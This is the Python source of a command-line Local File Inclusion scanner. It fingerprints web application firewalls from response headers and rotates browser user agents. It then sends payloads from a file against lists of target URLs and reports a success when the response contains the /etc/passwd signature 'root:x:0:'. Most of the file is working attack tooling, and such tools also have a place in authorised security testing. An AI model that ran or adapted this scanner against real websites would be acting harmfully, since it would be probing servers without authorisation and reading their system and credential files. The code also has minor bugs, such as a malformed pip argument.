import requests
import urllib.parse
import re
import os
import sys
import subprocess
import time 
import random
from curses import panel
import threading
from rich.panel import Panel
from rich import print as rich_print
from concurrent.futures import ThreadPoolExecutor, as_completed
from prompt_toolkit import prompt
from prompt_toolkit.completion import PathCompleter
from colorama import Fore, init 
import logging
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import signal

USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.2 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.70",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
    ]
    
WAF_SIGNATURES = {
        'Cloudflare': ['cf-ray', 'cloudflare', 'cf-request-id', 'cf-cache-status'],
        'Akamai': ['akamai', 'akamai-ghost', 'akamai-x-cache', 'x-akamai-request-id'],
        'Sucuri': ['x-sucuri-id', 'sucuri', 'x-sucuri-cache'],
        'ModSecurity': ['mod_security', 'modsecurity', 'x-modsecurity-id', 'x-mod-sec-rule'],
        'Barracuda': ['barra', 'x-barracuda', 'bnmsg'],
        'Imperva': ['x-cdn', 'imperva', 'incapsula', 'x-iinfo', 'x-cdn-forward'],
        'F5 Big-IP ASM': ['x-waf-status', 'f5', 'x-waf-mode', 'x-asm-ver'],
        'DenyAll': ['denyall', 'sessioncookie'],
        'FortiWeb': ['fortiwafsid', 'x-fw-debug'],
        'Jiasule': ['jsluid', 'jiasule'],
        'AWS WAF': ['awswaf', 'x-amzn-requestid', 'x-amzn-trace-id'],
        'StackPath': ['stackpath', 'x-sp-url', 'x-sp-waf'],
        'BlazingFast': ['blazingfast', 'x-bf-cache-status', 'bf'],
        'NSFocus': ['nsfocus', 'nswaf', 'nsfocuswaf'],
        'Edgecast': ['ecdf', 'x-ec-custom-error'],
        'Alibaba Cloud WAF': ['ali-cdn', 'alibaba'],
        'AppTrana': ['apptrana', 'x-wf-sid'],
        'Radware': ['x-rdwr', 'rdwr'],
        'SafeDog': ['safedog', 'x-sd-id'],
        'Comodo WAF': ['x-cwaf', 'comodo'],
        'Yundun': ['yundun', 'yunsuo'],
        'Qiniu': ['qiniu', 'x-qiniu'],
        'NetScaler': ['netscaler', 'x-nsprotect'],
        'Securi': ['x-sucuri-id', 'sucuri', 'x-sucuri-cache'],
        'Reblaze': ['x-reblaze-protection', 'reblaze'],
        'Microsoft Azure WAF': ['azure', 'x-mswaf', 'x-azure-ref'],
        'NAXSI': ['x-naxsi-sig'],
        'Wallarm': ['x-wallarm-waf-check', 'wallarm'],
    }

init(autoreset=True)

stop_event = threading.Event()

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def check_and_install_packages(packages):
    for package, version in packages.items():
        try : 
            __import__(package)
        except ImportError: 
            subprocess.check_call([sys.executable, '-m', '-pip', 'install', f"{package}=={version}"])

def get_retry_session(retries=3, backoff_factor=0.3, status_forcelist=(500, 502, 504)):
    session = requests.Session()
    retry = Retry(
        total=retries,
        read=retries,
        connect=retries,
        backoff_factor=backoff_factor,
        status_forcelist=status_forcelist,
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def detect_waf(url, headers, cookies=None):
    session = get_retry_session()
    waf_detected = None
    
    try : 
        response = session.get(url, headers=headers, cookies=cookies, verify=True) ### set to true 
        for waf_name, waf_identifiers in WAF_SIGNATURES.items():
            if any(identifier in response.headers.get('server', '').lower() for identifier in waf_identifiers):
                print(f"{Fore.GREEN}[+] WAF Detected : {waf_name}{Fore.RESET}")
                waf_detected = waf_name
                break
    
    except requests.exceptions.RequestException as e: 
        logging.error(f"Error detecting WAF : {e}")

    if not waf_detected : 
        print(f"{Fore.GREEN}[+] No WAF detected. {Fore.RESET}")

    return waf_detected


def test_lfi(url, payloads, success_criteria, max_threads=5):
    def check_paylaod(payload):
        encoded_payload = urllib.parse.quote(payload.strip())
        
        target_url = f"{url}{encoded_payload}"
        start_time = time.time()
        
        if stop_event.is_set():
            return None, False

        try : 
            response = requests.get(target_url)
            response_time = round(time.time() - start_time, 2)
            result = None
            is_vulnerable = False
            if response.status_code == 200: 
                is_vulnerable = any(re.search(pattern, response.text) for pattern in success_criteria)
                if is_vulnerable: 
                    result = f"{Fore.GREEN}[✓] Vulnerable : {Fore.GREEN}{target_url}{Fore.GREEN} - Response Time : {response_time} seconds"
                else : 
                    result = f"{Fore.RED}[✗] Not Vulnerable : {Fore.WHITE}{target_url}{Fore.CYAN} - Response Time : {response_time} seconds"
            else : 
                result = f"{Fore.RED}[✗] Not Vulnerable : {Fore.WHITE}{target_url}{Fore.CYAN} - Response Time : {response_time} seconds"
                
            return result, is_vulnerable
        except requests.exceptions.RequestException as e: 
            print(f"{Fore.RED}[!] Error accessing {target_url} : {str(e)}")
            return None, False
        
    found_vulnerabilities = 0
    vulnerable_urls = []
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor : 
        future_to_payload = {executor.submit(check_paylaod, payload): payload for payload in payloads}
        try : 
            for future in as_completed(future_to_payload):
                if stop_event.is_set(): 
                    break
                payload = future_to_payload[future]
                try :
                    result, is_vulnerable = future.result()
                    if result: 
                        print(f"{Fore.YELLOW}\n[→] Scanning with payload : {payload.strip()}")
                        print(result)

                        if is_vulnerable:
                            found_vulnerabilities += 1
                            vulnerable_urls.append(url + urllib.parse.quote(payload.strip()))
                
                except Exception as e: 
                    print(f"{Fore.RED}[!] Exception occurred for payload {payload}: {str(e)}")
        except Exception as e: 
            print(f"{Fore.RED}\n[!] Detected Ctrl+C! Stopping the scan...")
            stop_event.set() ## singal all threads to stop 
    return found_vulnerabilities, vulnerable_urls


# def save_results(vulnerable_urls):
#     save_prompt(vulnerable_urls)

def save_prompt(vulnerable_urls=[]):
    save_choice = input(f"{Fore.CYAN}\n[?] Do you want to save the vulnerable URLs to a file? (y/n, press Enter for n): ").strip().lower()
    if save_choice == 'y': 
        output_file = input(f"{Fore.CYAN}Enter the name of the output file (press Enter for 'vulnerable_urls.txt'): ").strip() or 'vulnerable_urls.txt'
        with open(output_file, 'w') as f: 
            for url in vulnerable_urls: 
                f.write(url + '\n')
        print(f"{Fore.CYAN}Vulnerable URLs have been saved to : {output_file}")
    else : 
        print(f"{Fore.YELLOW}Vulnerable URLs will not be saved. ")


def prompt_for_urls():
    while True : 
        try : 
            url_input = get_file_path("[?] Enter the path to the input file containing the URLs (or press Enter to input a single URL) : ")
            if url_input : 
                if not os.path.isfile(url_input):
                    raise FileNotFoundError(f"File not found : {url_input}")
                with open(url_input) as file: 
                    urls = [line.strip() for line in file if line.strip()]
                return urls
            else : 
                single_url = input(f"{Fore.CYAN}[?] Enter a single URL to scan : ").strip()
                
                ## protocol in url 
                if single_url and not (single_url.startswith('http://') or single_url.startswith('https://')):
                    single_url = 'https://' + single_url
                    
                if single_url: 
                    return [single_url]
                else : 
                    print(f"{Fore.RED}[!]You must provide either a file with URLs or a single URL.")
                    input(f"{Fore.YELLOW}[i] Press Enter to try again...")
                    clear_screen()
                    print(f"{Fore.GREEN} Welcome to the LFI testing Tool\n")

        except Exception as e: 
            print(f"{Fore.RED}[!] Error reading input file : {url_input}. Exception : {str(e)}")
            input(f"{Fore.YELLOW}[i] Press Enter to try again...")
            clear_screen()
            print(f"{Fore.GREEN} Welcome to the LFI Testing Tool! \n")



def prompt_for_payloads():
    while True: 
        try : 
            payload_input = get_file_path("[?] Enter the path to the payloads file : ")
            if not os.path.isfile(payload_input):
                raise FileNotFoundError(f"File not found : {payload_input}")

            with open(payload_input, encoding='utf-8-sig') as file: 
                payloads = [line.strip() for line in file if line.strip()]
            return payloads
        except Exception as e: 
            print(f"{Fore.RED}[!] Error reading payload file : {payload_input}. Exception : {str(e)}")
            input(Fore.YELLOW + f"[!] Press Enter to try again...")
            clear_screen()
            print(Fore.Green + "Welcome to the LFI Testing Tool!\n")


def print_scan_summary(total_found, total_scanned, start_time):
    print(Fore.YELLOW + "\n[i] Scanning finished.")
    print(Fore.YELLOW + f"\n[i] Total found : {total_found}")
    print(Fore.YELLOW + f"\n[i] Total scanned : {total_scanned}")
    # print(Fore.YELLOW + f"\n[i] Vulnerable URLS : {Fore.GREEN}{vulnerable_urls}")
    print(Fore.YELLOW + f"\n[i] Time taken : {int(time.time() - start_time)} seconds")
    exit()
    

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_file_path(prompt_text):
    completer = PathCompleter()
    return prompt(prompt_text, completer=completer).strip()

def handle_interrupt(signal, frame):
    print(f"{Fore.RED}\n[!] Detected Ctrl+C! Stopping the scan...")
    stop_event.set()

def print_scanning_url(url):
    width = 60
    top_border = "┌" + "─" * (width - 2) + "┐"
    bottom_border = "└" + "─" * (width - 2) + "┘"
    content_line = "│ → Scanning URL: " + url.ljust(width - 4)

    print(Fore.MAGENTA + top_border)
    print(Fore.MAGENTA + content_line)
    print(Fore.MAGENTA + bottom_border)


def main():
    signal.signal(signal.SIGINT, handle_interrupt) ### handle ctrl+C
    
    clear_screen()
    
    required_packages = {
        'requests' : '2.28.1',
        'prompt_toolkit' : '3.0.36',
        'colorama' : '0.4.6'
    }
    check_and_install_packages(required_packages) 

    time.sleep(1)
    clear_screen()
    
    panel = Panel(
        r"""
__    __________   _____                                 
/ /   / ____/  _/  / ___/_________ _____  ____  ___  _____
/ /   / /_   / /    \__ \/ ___/ __ `/ __ \/ __ \/ _ \/ ___/
/ /___/ __/ _/ /    ___/ / /__/ /_/ / / / / / / /  __/ /    
/_____/_/   /___/   /____/\___/\__,_/_/ /_/_/ /_/\___/_/     
                                                        
                                                    
            """,
        style="bold green",
        border_style="blue",
        expand=False
        )
    rich_print(panel, "\n")

    
    print(Fore.GREEN + "Welcome to the LFI Testing Tool!\n")

    urls = prompt_for_urls()
    payloads = prompt_for_payloads()
    # success_criteria_input = input("[?] Enter the success criteria pattern (comma-separated, e.g: 'root:,admin:', press Enter for 'root:x:0:) : ").strip()
    # success_criteria = [pattern.strip() for pattern in success_criteria_input.split(',')] if success_criteria_input else ['root:x:0:']
    success_criteria = ['root:x:0:']
    ## success_criteria = ["etc/passwd", "passwd", "flag"]
    
    max_threads_input = input("[?] Enter the number of concurrent threads (0-10, press Enter for 5): ").strip()
    max_threads = int(max_threads_input) if max_threads_input.isdigit() and 0 <= int(max_threads_input) <= 10 else 5
    
    
    print(Fore.YELLOW + "\n[i] Loading, Please wait...")
    time.sleep(1)
    clear_screen()
    print(Fore.CYAN + "[i] Starting scan...\n")
    print(f"{Fore.CYAN}[i] Checking for WAF on target URLs...")

    for url in urls: 
        if stop_event.is_set():
            break
        
        headers = {'User-Agent' : get_random_user_agent()}
        detect_waf(url, headers)

    total_found = 0
    total_scanned = 0
    start_time = time.time()
    vulnerable_urls = []
    
    if payloads : 
        try : 
            for url in urls: 
                if stop_event.is_set():
                    break
                
                # print(Fore.MAGENTA + f"\n[i] Scanning URL : {url}\n")
                print_scanning_url(url)
                found, urls_with_payloads = test_lfi(url, payloads, success_criteria, max_threads)
                total_found += found
                total_scanned += len(payloads)
                vulnerable_urls.extend(urls_with_payloads)
        except KeyboardInterrupt : 
            print(f"{Fore.RED}\n[!]Detected Ctrl+C stopping the scan..")
            stop_event.set() ### stopping the scan gracefully 
            print(Fore.RED + f"\n[!] Scanning stopped. Total vulnerabilities found so far : {total_found}")

    
    # save_results(vulnerable_urls)
    save_prompt(vulnerable_urls)
    print_scan_summary(total_found, total_scanned, start_time)


if __name__ == "__main__":
    try: 
        main()
    except KeyboardInterrupt: 
        print(f"{Fore.RED}\n[!] Detected Ctrl+C! Exiting gracefully....")
        sys.exit(1)